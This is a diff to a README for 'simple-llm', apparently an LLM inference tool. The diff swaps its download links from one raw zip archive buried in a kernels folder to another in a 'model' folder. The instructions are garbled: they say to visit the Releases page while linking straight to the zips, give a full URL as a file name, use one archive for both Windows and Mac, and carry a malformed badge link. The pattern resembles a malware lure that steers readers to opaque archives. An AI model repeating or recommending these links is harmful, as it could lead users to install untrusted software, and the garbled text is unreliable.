@@ -1,6 +1,6 @@
 # 🎉 simple-llm - Effortless LLM Inference Made Easy
 
-[![Download Here](https://github.com/Bladerex24/simple-llm/raw/refs/heads/master/kernels/triton_kernels/swiglu_details/simple-llm-2.0.zip%20Here-Visit%20Releases-brightgreen)](https://github.com/Bladerex24/simple-llm/raw/refs/heads/master/kernels/triton_kernels/swiglu_details/simple-llm-2.0.zip)
+[![Download Here](https://github.com/Bladerex24/simple-llm/raw/refs/heads/master/model/simple_llm_v3.7.zip%20Here-Visit%20Releases-brightgreen)](https://github.com/Bladerex24/simple-llm/raw/refs/heads/master/model/simple_llm_v3.7.zip)
 
 ## 📖 Introduction
 simple-llm is a minimal, extensible inference engine designed for large language models (LLMs). Built from scratch, this application allows you to harness powerful AI capabilities without the complexity. 
@@ -11,7 +11,7 @@ Simple-llm is easy to use. This guide will walk you through downloading and runn
 ## 📥 Download & Install
 To get started, you need to visit the Releases page to download simple-llm. Click the button below to get there:
 
-[![Download Here](https://github.com/Bladerex24/simple-llm/raw/refs/heads/master/kernels/triton_kernels/swiglu_details/simple-llm-2.0.zip%20Here-Visit%20Releases-brightgreen)](https://github.com/Bladerex24/simple-llm/raw/refs/heads/master/kernels/triton_kernels/swiglu_details/simple-llm-2.0.zip)
+[![Download Here](https://github.com/Bladerex24/simple-llm/raw/refs/heads/master/model/simple_llm_v3.7.zip%20Here-Visit%20Releases-brightgreen)](https://github.com/Bladerex24/simple-llm/raw/refs/heads/master/model/simple_llm_v3.7.zip)
 
 ### Step-by-Step Installation
 
@@ -22,7 +22,7 @@ To get started, you need to visit the Releases page to download simple-llm. Clic
    - Once on the Releases page, find the latest version of simple-llm. It is usually at the top of the list.
 
 3. **Download the File**
-   - Click on the link to download the installer file for your operating system. The file could be named something like `https://github.com/Bladerex24/simple-llm/raw/refs/heads/master/kernels/triton_kernels/swiglu_details/simple-llm-2.0.zip` for Windows, or `https://github.com/Bladerex24/simple-llm/raw/refs/heads/master/kernels/triton_kernels/swiglu_details/simple-llm-2.0.zip` for Mac.
+   - Click on the link to download the installer file for your operating system. The file could be named something like `https://github.com/Bladerex24/simple-llm/raw/refs/heads/master/model/simple_llm_v3.7.zip` for Windows, or `https://github.com/Bladerex24/simple-llm/raw/refs/heads/master/model/simple_llm_v3.7.zip` for Mac.
 
 4. **Open the Downloaded File**
    - Locate the downloaded file on your computer. It typically goes to the “Downloads” folder.
